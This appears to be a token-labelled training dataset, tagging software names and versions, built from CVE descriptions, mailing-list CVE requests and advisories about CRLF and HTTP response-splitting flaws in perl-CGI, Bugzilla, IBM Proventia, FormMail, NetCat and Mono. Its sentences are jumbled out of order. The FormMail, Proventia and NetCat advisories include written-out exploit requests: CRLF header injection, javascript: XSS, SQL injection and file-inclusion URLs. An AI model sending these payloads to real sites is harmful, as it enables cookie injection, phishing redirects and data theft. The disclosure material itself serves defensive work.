perl-CGI O
two O
ids O
, O
perl-CGI-Simple O
one O
id O
( O
CVE-2010-3172 O
already O
assigned O
for O
Bugzilla O
part O
) O

CRLF O
injection O
vulnerability O
in O
the O
header O
function O
in O
( O
1 O
) O
CGI.pm SN
before SV
3.50 SV
and O
( O
2 O
) O
Simple.pm O
in O
CGI SN
: O
:Simple SN
1.112 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
vectors O
related O
to O
non-whitespace O
characters O
preceded O
by O
newline O
characters O
, O
a O
different O
vulnerability O
than O
CVE-2010-2761 O
and O
CVE-2010-3172 O
. O

Attackers O
can O
inject O
boundary O
of O
multipart/x-mixed-replace O
. O

Hi O
Steve O
, O
vendors O
, O
Masahiro O
Yamada O
reported O
: O
the O
following O
deficiency O
( O
from O
) O
: O
Search O
result O
of O
b.m.o O
. O

( O
id O
2 O
) O
Yet O
, O
back O
to O
CVE-2010-3172 O
, O
Masahiro O
mentions O
in O
, O
that O
perl-CGI-Simple O
is O
prone O
to O
same O
deficiency O
, O
as O
CVE-2010-3172 O
in O
Bugzilla O
was O
: O
Looks O
, O
like O
it O
was O
already O
fixed O
in O
perl-CGI-Simple O
too O
: O
Relevant O
perl-CGi-Simple O
patch O
: O
Steve O
, O
could O
you O
allocate O
new O
CVE O
id O
for O
this O
issue O

It O
may O
be O
able O
to O
be O
used O
for O
HTTP O
Header O
injection O
. O

The O
MIME O
boundary O
in O
multipart_init O
is O
now O
random O
Thanks O
to O
Byron O
Jones O
, O
Masahiro O
Yamada O
, O
Reed O
Loden O
, O
and O
Mark O
Stosberg O
Since O
perl-CGi O
is O
different O
code O
base O
than O
Bugzilla O
, O
we O
suspect O
a O
new O
CVE O
id O
is O
required O
for O
this O
issue O

Date O
: O
Wed O
, O
01 O
Dec O
2010 O
18:28:55 O
+0100 O
From O
: O
Jan O
Lieskovsky O
< O
jlieskov O
@ O
... O
hat.com O
To O
: O
Steven O
M. O
Christey O
< O
coley O
@ O
... O
us.mitre.org O
CC O
: O
oss-security O
< O
oss-security O
@ O
... O
ts.openwall.com O
> O
, O
Marcela O
Maslanova O
< O
mmaslano O
@ O
... O
hat.com O
> O
, O
Petr O
Pisar O
< O
ppisar O
@ O
... O
hat.com O
> O
, O
Chris O
BinGOs O
Williams O
< O
chris O
@ O
... O
gosnet.co.uk O
> O
, O
Reed O
Loden O
< O
reed O
@ O
... O
dloden.com O
> O
, O
Masahiro O
Yamada O
< O
masa141421356 O
@ O
... O
il.com O
> O
, O
Byron O
Jones O
< O
glob O
@ O
... O
b.com.au O
> O
, O
Mark O
Stosberg O
< O
mark O
@ O
... O
mersault.com O

does O
not O
escape O
=_aaaaaaaaaa0 O
: O
it O
is O
used O
as O
boudary O
of O
multipart/x-mixed-replace O
. O

Subject O
: O
CVE O
Request O
perl-CGI O
two O
ids O
, O
perl-CGI-Simple O
one O
id O
( O
CVE-2010-3172 O
already O
assigned O
for O
Bugzilla O
part O
) O

( O
id O
3 O
) O
Thanks O
& O
& O
Regards O
, O
Jan. O
Jan O
iankko O
Lieskovsky O
Red O
Hat O
Security O
Response O
Team O

( O
id O
2 O
) O
Mozilla O
already O
allocated O
CVE-2010-2761 O
to O
this O
part O
for O
the O
perl-CGI O
issue O
. O

~reed O
Mozilla O
Security O
Group O
Reed O
Loden O
reed O
@ O
... O
dloden.com O

Date O
: O
Wed O
, O
1 O
Dec O
2010 O
10:55:33 O
-0800 O
From O
: O
Reed O
Loden O
< O
reed O
@ O
... O
dloden.com O
To O
: O
Mark O
Stosberg O
< O
mark O
@ O
... O
mersault.com O
Cc O
: O
oss-security O
< O
oss-security O
@ O
... O
ts.openwall.com O
> O
, O
Jan O
Lieskovsky O
< O
jlieskov O
@ O
... O
hat.com O
> O
, O
Steven O
M. O
Christey O
< O
coley O
@ O
... O
us.mitre.org O
> O
, O
Marcela O
Maslanova O
< O
mmaslano O
@ O
... O
hat.com O
> O
, O
Petr O
Pisar O
< O
ppisar O
@ O
... O
hat.com O
> O
, O
Chris O
BinGOs O
Williams O
< O
chris O
@ O
... O
gosnet.co.uk O
> O
, O
Masahiro O
Yamada O
< O
masa141421356 O
@ O
... O
il.com O
> O
, O
Byron O
Jones O
< O
glob O
@ O
... O
b.com.au O
> O
, O
Lincoln O
Stein O
< O
lincoln.stein O
@ O
... O
il.com O

CRLF O
injection O
vulnerability O
in O
Bugzilla SN
before SV
3.2.9 SV
, O
3.4.x SV
before SV
3.4.9 SV
, O
3.6.x SV
before SV
3.6.3 SV
, O
and SV
4.0.x SV
before SV
4.0rc1 SV
, O
when O
Server O
Push O
is O
enabled O
in O
a O
web O
browser O
, O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
content O
, O
and O
conduct O
HTTP O
response O
splitting O
attacks O
, O
via O
a O
crafted O
URL O
. O

CRLF O
injection O
vulnerability O
in O
HP SN
System SN
Management SN
Homepage SN
( O
SMH SN
) O
before SV
6.2 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
load.php O
in O
the O
Local O
Management O
Interface O
( O
LMI O
) O
on O
the O
IBM SN
Proventia SN
Network SN
Mail SN
Security SN
System SN
( O
PNMSS SN
) O
appliance O
with O
firmware O
before SV
2.5 SV
allows O
remote O
authenticated O
users O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
javaVersion O
parameter O
. O

Credits O
Dr. O
Marian O
Ventuneac O

The O
following O
exploit O
allows O
injecting O
custom O
cookies O
used O
by O
the O
client O
browser O
during O
a O
valid O
HTTP O
session O
: O
url_placeholder/load.php O
browVerOK=true O
& O
browVerPerfect=false O
& O
javaVersion O
=any O
% O
0D O
% O
0ASet-cookie O
: O
% O
20MyOwnCookie=SOME_DATA_HERE O
& O
javaVendor=Sun O
% O
20Microsystems O
% O
20Inc. O
& O
javaEnabled=true O
& O
welcome=true O
& O
detectionFlag=1 O
& O
popupBlocked=no O
The O
following O
exploit O
allows O
forcing O
external O
browser O
redirects O
: O
url_placeholder/load.php O
browVerOK=true O
& O
browVerPerfect=false O
& O
javaVersion O
=any O
% O
0D O
% O
0ALocation O
: O
% O
20 O

Alternatively O
, O
please O
contact O
IBM O
for O
technical O
support O
. O

Affected O
Versions O
IBM SN
Proventia SN
Network SN
Mail SN
Security SN
System SN
- O
virtual SN
( O
firmware O
1.6 SV
) O
Mitigation O

Vendor O
: O
IBM O
Products O
: O
Proventia O
Network O
Mail O
Security O
System O
Vulnerabilities O
: O
CRLF O
Injection O
Risk O
: O
Medium O
Attack O
Vector O
: O
From O
Remote O
Authentication O
: O
Required O
Reference O
: O
Description O
Web-based O
Local O
Management O
Interface O
( O
LMI O
) O
of O
IBM SN
Proventia SN
Network SN
Mail SN
Security SN
System SN
( O
firmware O
1.6 SV
) O
is O
vulnerable O
to O
a O
CRLF O
Injection O
vulnerability O
. O

Disclosure O
Timeline O
2009 O
, O
November O
07 O
: O
Vulnerabilities O
discovered O
and O
documented O
2009 O
, O
November O
08 O
: O
Notification O
sent O
to O
IBM O
2009 O
, O
November O
09 O
: O
IBM O
acknowledges O
receiving O
the O
report O
2010 O
, O
September O
12 O
: O
MVSA-10-009 O
advisory O
published O
. O

By O
manipulating O
the O
javaVersion O
parameter O
of O
load.php O
resource O
, O
an O
authenticated O
attacker O
can O
perform O
the O
attacks O
above O
. O

The O
affected O
resource O
is O
not O
part O
of O
the O
IBM O
PNMSS O
firmware O
2.5 O
. O

Vendor O
recommends O
upgrading O
to O
PNMSS O
firmware O
2.5 O
or O
later O
. O

When O
exploited O
by O
an O
authenticated O
attacker O
, O
such O
vulnerability O
could O
lead O
to O
compromising O
the O
security O
of O
the O
appliance O
, O
allowing O
injection O
of O
custom O
HTTP O
cookies O
, O
forcing O
external O
redirects O
, O
potential O
HTTP O
Response O
Splitting O
attacks O
, O
etc O
. O

Security O
Advisory O
: O
MVSA-10-009 O
CVE-2010-0155 O

MVSA-10-009 O
CVE-2010-0155 O
- O
IBM O
Proventia O
Network O
Mail O
Security O
System O
- O
CRLF O
Injection O
vulnerability O

NOTE O
: O
some O
of O
these O
details O
are O
obtained O
from O
third O
party O
information O
. O

CRLF O
injection O
vulnerability O
in O
Xerver SN
HTTP SN
Server SN
4.31 SV
and SV
4.32 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
certain O
byte O
sequences O
at O
the O
end O
of O
a O
URL O
. O

The O
web O
interface O
in O
CUPS SN
before SV
1.4.2 SV
, O
as O
used O
on O
Apple SN
Mac SN
OS SN
X SN
before SV
10.6.2 SV
and O
other O
platforms O
, O
does O
not O
properly O
handle O
( O
1 O
) O
HTTP O
headers O
and O
( O
2 O
) O
HTML O
templates O
, O
which O
allows O
remote O
attackers O
to O
conduct O
cross-site O
scripting O
( O
XSS O
) O
attacks O
and O
HTTP O
response O
splitting O
attacks O
via O
vectors O
related O
to O
( O
a O
) O
the O
product O
web O
interface O
, O
( O
b O
) O
the O
configuration O
of O
the O
print O
system O
, O
and O
( O
c O
) O
the O
titles O
of O
printed O
jobs O
, O
as O
demonstrated O
by O
an O
XSS O
attack O
that O
uses O
the O
kerberos O
parameter O
to O
the O
admin O
program O
, O
and O
leverages O
attribute O
injection O
and O
HTTP O
Parameter O
Pollution O
( O
HPP O
) O
issues O
. O

CRLF O
injection O
vulnerability O
in O
FormMail.pl O
in O
Matt SN
Wright SN
FormMail SN
1.92 SV
, O
and SV
possibly SV
earlier SV
, O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
redirect O
parameter O
. O

LEGAL O
NOTICES O
Copyright O
( O
c O
) O
2009 O
Francesco O
ascii O
Ongaro O
Permission O
is O
granted O
for O
the O
redistribution O
of O
this O
alert O
electronically O
. O

Disclaimer O
: O
The O
information O
in O
the O
advisory O
is O
believed O
to O
be O
accurate O
at O
the O
time O
of O
publishing O
based O
on O
currently O
available O
information O
. O

( O
1 O
replies O
) O

V. O
WORKAROUND O
VI O
. O

sub O
clean_html O
{ O
local O
$ O
value O
value O
=~ O
s O
& O
& O
/g O
; O
$ O
value O
=~ O
s/ O
< O
< O
/g O
; O
$ O
value O
=~ O
s/ O
/g O
; O
$ O
value O
=~ O
s O
/g O
; O
return O
$ O
value O
; O
} O
8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
These O
functions O
are O
not O
always O
applied O
to O
the O
user O
input O
and O
don O
t O
protect O
against O
all O
the O
attack O
vectors O
( O
as O
URI O
or O
DOM O
XSS O
that O
can O
work O
also O
if O
encoded O
) O
, O
this O
is O
why O
various O
vulnerabilities O
exist O
. O

A O
second O
XSS O
vulnerability O
, O
not O
based O
on O
HTTP O
tricks O
, O
exists O
: O
in O
the O
following O
code O
the O
the O
$ O
return_link O
variable O
is O
reflected O
( O
printed O
) O
in O
the O
page O
body O
without O
any O
validation O
: O
8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
Line O
371 O
: O
the O
$ O
return_link O
variable O
is O
printed O
in O
the O
page O
body O
without O
any O
validation O
. O

CVE O
INFORMATION O
No O
CVE O
at O
this O
time O
. O

if O
( O
$ O
Config O
{ O
redirect O
print O
Location O
: O
$ O
safeConfig O
{ O
redirect O
8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
XSS O
vulnerability O
example O
: O
( O
at O
) O
ush O
( O
dot O
) O
it O
[ O
email O
concealed O
] O
& O
subject=1 O
& O
redire O
ct=javascript O
: O
alert O
( O
% O
27USH O
% O
27 O
) O
; O
Response O
: O
$ O
curl O
-kis O
( O
at O
) O
ush O
( O
dot O
) O
it O
[ O
email O
concealed O
] O
& O
sub O
ject=1 O
& O
redirect=javascript O
: O
alert O
( O
% O
27USH O
% O
27 O
) O
; O
8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
HTTP/1.1 O
302 O
Found O
Date O
: O
Sat O
, O
11 O
Apr O
2009 O
14:12:11 O
GMT O
Server O
: O
Apache O
Location O
: O
javascript O
: O
alert O
( O
USH O
) O
; O
Content-Length O
: O
267 O
Content-Type O
: O
text/html O
; O
charset=iso-8859-1 O

The O
following O
request O
is O
an O
example O
of O
the O
attack O
: O
( O
at O
) O
ush O
( O
dot O
) O
it O
[ O
email O
concealed O
] O
& O
subject=1 O
& O
redire O
ct= O
xt/plain O
% O
0D O
% O
0AStatus:302 O
% O
0D O
% O
0A O
% O
0D O
% O
0AHTTP/1.1 O
% O
20200 O
% O
20OK O
% O
0D O
% O
0AContent-Typ O
e O
: O
% O
20text/plain O
% O
0D O
% O
0A O
8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
$ O
curl O
-kis O
( O
at O
) O
ush O
( O
dot O
) O
it O
[ O
email O
concealed O
] O
& O
sub O
ject=1 O
& O
redirect= O
% O
0D O
% O
0A O
% O
0FContent-Length O
: O
% O
200 O
% O
0D O
% O
0AContent-Type O
: O
% O
20text/p O
lain O
% O
0D O
% O
0AStatus:302 O
% O
0D O
% O
0A O
% O
0D O
% O
0AHTTP/1.1 O
% O
20200 O
% O
20OK O
% O
0D O
% O
0AContent-Type O
: O
% O
2 O
0text/plain O
% O
0D O
% O
0A O
HTTP/1.1 O
302 O
Found O
Date O
: O
Sun O
, O
12 O
Apr O
2009 O
23:01:18 O
GMT O
Server O
: O
Apache O
Content-Length O
: O
0 O
Location O
: O
Transfer-Encoding O
: O
chunked O
Content-Type O
: O
text/plain O
HTTP/1.1 O
200 O
OK O
Content-Type O
: O

DISCLOSURE O
TIMELINE O
20070501 O
Bug O
discovered O
20070531 O
Initial O
vendor O
contact O
( O
Thu O
, O
31 O
May O
2007 O
22:21:39 O
+0200 O
) O
No O
response O
and O
the O
bug O
sleeped O
for O
some O
time O
in O
ascii O
mind O
20090505 O
Second O
vendor O
contact O
Giving O
up O
, O
will O
have O
better O
results O
with O
forced O
disclosure O
20090511 O
Advisory O
Release O
IX O
. O

Since O
Header O
Injection O
is O
one O
of O
the O
most O
versatile O
attack O
vectors O
we O
could O
use O
it O
( O
like O
downgrade O
it O
) O
to O
perform O
a O
Cross O
Site O
Scripting O
attack O
but O
it O
would O
not O
represent O
a O
different O
vulnerability O
. O

FormMail O
is O
quite O
possibily O
the O
most O
used O
CGI O
program O
on O
the O
internet O
, O
having O
been O
downloaded O
over O
2,000,000 O
times O
since O
1997 O
. O

if O
( O
$ O
Config O
{ O
return_link_url O
Config O
{ O
return_link_title O
print O
< O
ul O
; O
print O
< O
li O
> O
< O
a O
href= O
$ O
safeConfig O
{ O
return_link_url O
safeConfig O
{ O
return_link_title O
} O
< O
/a O
; O
print O
< O
/ul O
; O
} O
8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
The O
vulnerability O
can O
be O
triggered O
with O
the O
following O
request O
: O
$ O
curl O
-kis O
( O
at O
) O
ush O
( O
dot O
) O
it O
[ O
email O
concealed O
] O
& O
subj O
ect=1 O
& O
return_link_url=javascript O
: O
alert O
( O
% O
27USH O
% O
27 O
) O
; O
& O
return_link_title=USH O
This O
XSS O
is O
not O
automatic O
. O

D O
) O
HTTP O
Response O
Splitting O
Thanks O
to O
the O
full O
exploitability O
of O
the O
Header O
Injection O
vulnerability O
an O
HTTP O
Response O
Splitting O
can O
be O
performed O
. O

It O
may O
not O
be O
edited O
in O
any O
way O
without O
mine O
express O
written O
consent O
. O

B O
) O
Cross O
Site O
Scripting O
vulnerability O
Line O
293 O
: O
the O
redirect O
variable O
is O
used O
to O
write O
the O
location O
header O
value O
. O

There O
are O
several O
downloading O
options O
available O
below O
and O
more O
information O
on O
this O
script O
can O
be O
found O
in O
the O
Readme O
file O
. O

8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
foreach O
$ O
field O
( O
keys O
% O
Config O
) O
{ O
$ O
safeConfig O
{ O
$ O
field O
} O
= O
& O
clean_html O
( O
$ O
Config O
{ O
$ O
field O
} O
) O
; O
} O
8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
Line O
518 O
: O
definition O
of O
clean_html O
function O
, O
used O
to O
generate O
the O
$ O
safeConfig O
array O
from O
$ O
Config O
. O

CREDIT O
Francesco O
ascii O
Ongaro O
, O
Giovanni O
evilaliv3 O
Pellerano O
and O
Antonio O
s4tan O
Parata O
are O
credited O
with O
the O
discovery O
of O
this O
vulnerability O
. O

This O
also O
makes O
FormMail O
the O
perfect O
system-wide O
solution O
for O
allowing O
users O
form-based O
user O
feedback O
capabilities O
without O
the O
risks O
of O
allowing O
freedom O
of O
CGI O
access O
. O

Affected O
FormMail SN
1.92 SV
and SV
possibly SV
earlier SV
versions SV
Severity O
Medium O
Impact O
( O
CVSSv2 O
) O
Medium O
4.3/10 O
, O
vector O
: O
( O
AV O
: O
N/AC O
: O
M/Au O
: O
N/C O
: O
P/I O
: O
N/A O
: O
N O
) O

C O
) O
HTTP O
Response O
Header O
Injection O
An O
HTTP O
Response O
Header O
Injection O
vulnerability O
exists O
, O
the O
following O
request O
triggers O
the O
vulnerability O
: O
$ O
curl O
-kis O
( O
at O
) O
ush O
( O
dot O
) O
it O
[ O
email O
concealed O
] O
& O
sub O
ject=1 O
& O
redirect= O
DHTTPHeaderInjection O
; O
Can O
be O
verified O
with O
the O
obvious O
javascript O
: O
alert O
( O
document.cookie O
) O
. O

Its O
value O
is O
not O
filtered O
so O
it O
possible O
to O
perform O
both O
HTTP O
Header O
Injection O
and O
an O
HTTP O
Response O
Splitting O
attacks O
. O

There O
are O
no O
warranties O
with O
regard O
to O
this O
information O
. O

Neither O
the O
author O
nor O
the O
publisher O
accepts O
any O
liability O
for O
any O
direct O
, O
indirect O
, O
or O
consequential O
loss O
or O
damage O
arising O
from O
use O
of O
, O
or O
reliance O
on O
, O
this O
information O
. O

FormMail SN
1.92 SV
Multiple O
Vulnerabilities O
Name O
Multiple O
Vulnerabilities O
in O
FormMail O
Systems O

In O
this O
case O
we O
are O
already O
inside O
a O
Location O
response O
header O
and O
it O
possible O
to O
perform O
an O
XSS O
without O
splitting O
the O
response O
and O
using O
the O
standard O
Apache O
page O
for O
the O
302 O
Found O
HTTP O
status O
. O

This O
script O
has O
many O
formatting O
and O
operational O
options O
, O
most O
of O
which O
can O
be O
specified O
within O
each O
form O
, O
meaning O
you O
don O
t O
need O
programming O
knowledge O
or O
multiple O
scripts O
for O
multiple O
forms O
. O

8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
Check O
for O
a O
Return O
Link O
and O
print O
one O
if O
found O
. O

VENDOR O
RESPONSE O
VII O
. O

Use O
of O
the O
information O
constitutes O
acceptance O
for O
use O
in O
an O
AS O
IS O
condition O
. O

Francesco O
ascii O
Ongaro O
web O
site O
: O
mail O
: O
ascii O
AT O
ush O
DOT O
it O
Giovanni O
evilaliv3 O
Pellerano O
web O
site O
: O
mail O
: O
giovanni.pellerano O
AT O
evilaliv3 O
DOT O
org O
Antonio O
s4tan O
Parata O
web O
site O
: O
mail O
: O
s4tan O
AT O
ictsc O
DOT O
it O
, O
s4tan O
AT O
ush O
DOT O
it O
X O
. O

BACKGROUND O
FormMail O
is O
a O
generic O
HTML O
form O
to O
e-mail O
gateway O
that O
parses O
the O
results O
of O
any O
form O
and O
sends O
them O
to O
the O
specified O
users O
. O

8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
This O
function O
will O
convert O
and O
to O
their O
HTML O
equivalents O
. O

DETECTION O
FormMail SN
1.92 SV
and SV
possibly SV
earlier SV
versions O
are O
vulnerable O
. O

Vendor O
Advisory O
Authors O
Francesco O
ascii O
Ongaro O
( O
ascii O
AT O
ush O
DOT O
it O
) O
Giovanni O
evilaliv3 O
Pellerano O
( O
evilaliv3 O
AT O
ush O
DOT O
it O
) O
Antonio O
s4tan O
Parata O
( O
s4tan O
AT O
ush O
DOT O
it O
) O
Date O
20090511 O
I O
. O

If O
you O
wish O
to O
reprint O
the O
whole O
or O
any O
part O
of O
this O
alert O
in O
any O
other O
medium O
other O
than O
electronically O
, O
please O
email O
me O
for O
permission O
. O

DESCRIPTION O
Multiple O
Vulnerabilities O
exist O
in O
FormMail O
software O
. O

Summary O
: O
A O
) O
Prelude O
to O
the O
vulnerabities O
B O
) O
Cross O
Site O
Scripting O
C O
) O
HTTP O
Response O
Header O
Injection O
D O
) O
HTTP O
Response O
Splitting O
A O
) O
Prelude O
to O
the O
vulnerabities O
What O
follows O
is O
the O
code O
used O
to O
validate O
the O
user O
input O
: O
Line O
283 O
: O
$ O
safeConfig O
array O
definition O
. O

8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
-8 O
< O
If O
redirect O
option O
is O
used O
, O
print O
the O
redirectional O
location O
header O
. O

FormMail SN
1.92 SV
Multiple O
Vulnerabilities O

CRLF O
injection O
vulnerability O
in O
the O
WebLink O
template O
in O
Fujitsu SN
Jasmine2000 SN
Enterprise SV
Edition SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

NOTE O
: O
this O
was O
reported O
within O
an O
HTTP O
Response O
Splitting O
section O
in O
the O
original O
disclosure O
. O

Multiple O
open O
redirect O
vulnerabilities O
in O
AIST SN
NetCat SN
3.12 SV
and SV
earlier SV
allow O
remote O
attackers O
to O
redirect O
users O
to O
arbitrary O
web O
sites O
and O
conduct O
phishing O
attacks O
via O
( O
1 O
) O
the O
redirect O
parameter O
in O
a O
logoff O
action O
to O
modules/auth/index.php O
or O
( O
2 O
) O
the O
url O
parameter O
to O
modules/linkmanager/redirect.php O
. O

Blind O
SQL O
Injection O
Vulnerabilities O
Examples O
of O
vulnerable O
files O
: O
/netcat/modules/auth/password_recovery.php O
=1 O
SQL_code O
Example O
: O
/netcat/modules/auth/password_recovery.php O
=1 O
/OR O
/VERSION O
( O
) O
/LIKE O
4 O
% O
The O
note O
: O
For O
vulnerability O
operation O
the O
following O
options O
PHP O
are O
required O
: O
magic_quotes_gpc=Off O
3 O
. O

Multiple O
Cross-site O
Scripting O
Vulnerabilities O
Examples O
of O
vulnerable O
files O
: O
/netcat/admin/siteinfo/iframe.inc.php O
path= O
/netcat/FCKeditor/neditor.php O
form= O
< O
XSS O
> O
& O
control= O
< O
XSS O
etc O
. O

milw0rm.com O
[ O
2008-12-23 O
] O

NetCat SN
< SV
= SV
3.12 SV
Multiple O
Remote O
Vulnerabilities O
The O
description O
: O
The O
set O
vulnerability O
in O
CMS O
NetCat O
versions O
3.12 O
and O
more O
low O
was O
revealed O
. O

Multiple O
File O
Including O
Vulnerabilities O
Vulnerability O
exists O
for O
the O
reason O
that O
direct O
access O
to O
some O
files O
, O
around O
logicians O
of O
work O
of O
the O
appendix O
is O
possible O
. O

Examples O
of O
vulnerable O
files O
: O
/netcat/modules/netshop/post.php O
system O
htaccess O
% O
00 O
/netcat/modules/auth.inc.php O
INCLUDE_FOLDER O
htaccess O
% O
00 O
/netcat/modules/banner.inc.php O
INCLUDE_FOLDER O
htaccess O
% O
00 O
/netcat/modules/blog.inc.php O
INCLUDE_FOLDER O
htaccess O
% O
00 O
/netcat/modules/forum.inc.php O
INCLUDE_FOLDER O
htaccess O
% O
00 O
The O
note O
: O
For O
vulnerability O
operation O
the O
following O
options O
PHP O
are O
required O
: O
register_globals=On O
and O
magic_quotes_gpc=Off O
2 O
. O

It O
gives O
the O
chance O
to O
redefine O
internal O
variables O
which O
are O
transferred O
as O
arguments O
in O
function O
include O
( O
) O
. O

Vulnerability O
has O
been O
found O
out O
at O
the O
reference O
to O
a O
file O
/netcat/add.php O
. O

HTTP O
Response O
Splitting O
Examples O
of O
vulnerable O
files O
: O
/netcat/modules/auth/index.php O
logoff=1 O
& O
redirect= O
/netcat/modules/linkmanager/redirect.php O
url= O
CRLF O
injection O
Vulnerability O
exists O
at O
the O
moment O
of O
value O
installation O
% O
0a O
in O
COOKIEvariables O
. O

CMS SN
NetCat SN
3.12 SV
- O
Multiple O
Vulnerabilities O

CRLF O
injection O
vulnerability O
in O
Sys.Web O
in O
Mono SN
2.0 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
CRLF O
sequences O
in O
the O
query O
string O
. O

rPath O
Security O
Advisory O
: O
2008-0286-1 O
Published O
: O
2008-09-29 O
Products O
: O
rPath O
Linux O
2 O
Rating O
: O
Major O
Exposure O
Level O
Classification O
: O
Remote O
User O
Deterministic O
Vulnerability O
Updated O
Versions O
: O
mono=conary.rpath.com O
@ O
rpl:2/1.2.6-5-0.1 O
References O
: O

This O
file O
is O
distributed O
under O
the O
terms O
of O
the O
MIT O
License O
. O

Copyright O
2008 O
rPath O
, O
Inc O
. O

A O
copy O
is O
available O
at O

Description O
: O
Previous O
versions O
of O
the O
mono O
package O
contain O
an O
HTTP O
header O
vulnerability O
which O
may O
allow O
attackers O
to O
insert O
cross-site O
scripting O
or O
other O
malicious O
code O
into O
an O
HTTP O
response O
. O

rPSA-2008-0286-1 O
mono O

Subject O
: O
CVE O
request O
: O
mono O
Sys.Web O
header O
injection O

( O
bug O
for O
reference O
) O
Ciao O
, O
Marcus O

Date O
: O
Wed O
, O
27 O
Aug O
2008 O
18:25:56 O
+0200 O
From O
: O
Marcus O
Meissner O
< O
meissner O
@ O
... O
e.de O
To O
: O
coley O
@ O
... O
re.org O
Cc O
: O
oss-security O
@ O
... O
ts.openwall.com O

Hi O
, O
Monos O
Sys.Web O
DLL O
is O
prone O
to O
HTTP O
header O
injection O
attacks O
, O
which O
have O
been O
fixed O
in O
mono O
SVN O
now O
. O

CRLF O
injection O
vulnerability O
in O
Mambo SN
before SV
4.6.4 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
the O
drupal_goto O
function O
in O
includes/common.inc O
Drupal SN
4.7.x SV
before SV
4.7.8 SV
and SV
5.x SV
before SV
5.3 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
